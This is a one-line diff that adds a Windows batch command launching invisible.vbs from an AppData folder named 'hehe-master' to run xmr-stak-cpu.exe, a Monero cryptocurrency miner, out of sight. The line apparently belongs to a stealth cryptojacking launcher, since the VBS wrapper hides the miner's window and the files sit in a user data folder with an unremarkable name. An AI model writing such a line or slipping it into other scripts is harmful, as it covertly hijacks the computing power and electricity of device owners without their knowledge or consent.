@@ -1,0 +1,1 @@
+start %AppData%\hehe-master\invisible.vbs %AppData%\hehe-master\xmr-stak-cpu.exe
